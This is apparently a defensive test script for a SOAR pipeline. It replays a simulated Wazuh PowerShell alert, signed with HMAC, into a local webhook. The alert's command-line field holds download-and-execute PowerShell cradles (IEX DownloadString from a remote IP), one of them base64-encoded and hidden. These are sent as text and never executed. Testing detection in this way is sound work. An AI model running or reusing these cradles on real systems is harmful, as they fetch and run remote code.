#!/usr/bin/env python3
"""Rejoue une alerte Wazuh réaliste dans le webhook SOAR, signée HMAC.

Sert à tester le SYSTÈME SOAR de bout en bout (webhook → match → playbook →
Slack) sans dépendre d'une détonation live. L'alerte a la forme réelle d'un
événement Wazuh ; seul le transport (injection au lieu de push Wazuh) est simulé.

Usage :
  .venv/bin/python tools/replay_alert.py                 # score ~8 : chaîne directe → Slack
  .venv/bin/python tools/replay_alert.py --encoded       # PowerShell encodé, score élevé → approbation
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import urllib.request
from pathlib import Path


def env(key: str, default: str = "") -> str:
    for line in Path(".env").read_text(encoding="utf-8").splitlines():
        if line.startswith(f"{key}="):
            return line.split("=", 1)[1].strip()
    return default


def build_alert(encoded: bool) -> dict:
    if encoded:
        payload = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/p.ps1')"
        cmd = (
            "powershell.exe -NoP -W Hidden -Enc "
            + base64.b64encode(payload.encode("utf-16-le")).decode()
        )
        user = "CORP\\Administrator"  # privilégié → booste le score (démo approbation)
    else:
        cmd = (
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
            "\"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')\""
        )
        user = "CORP\\j.tremblay"  # non-privilégié → score bas → chaîne directe
    return {
        "id": "replay-" + os.urandom(6).hex(),  # unique => pas de dédup
        "timestamp": "2026-07-23T01:50:00.000Z",
        "agent": {"id": "001", "name": "VICTIM-WIN", "ip": "10.0.0.20"},
        "rule": {
            "id": "100101",
            "level": 8,
            "description": "PowerShell suspect (T1059.001)",
            "mitre": {"id": ["T1059.001"], "tactic": ["Execution"]},
        },
        "data": {"win": {"eventdata": {"user": user, "commandLine": cmd}}},
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument(
        "--encoded", action="store_true", help="PowerShell encodé, score élevé"
    )
    ap.add_argument("--url", default="http://127.0.0.1:8000/webhook/wazuh")
    args = ap.parse_args()

    alert = build_alert(args.encoded)
    body = json.dumps(alert).encode()
    secret = env("WEBHOOK_HMAC_SECRET").encode()
    sig = hmac.new(secret, body, hashlib.sha256).hexdigest()

    req = urllib.request.Request(
        args.url,
        data=body,
        headers={"Content-Type": "application/json", "X-Signature": sig},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        print("HTTP", r.status)
        print(json.dumps(json.load(r), indent=2, ensure_ascii=False))
    print("alert_id:", alert["id"])


if __name__ == "__main__":
    main()
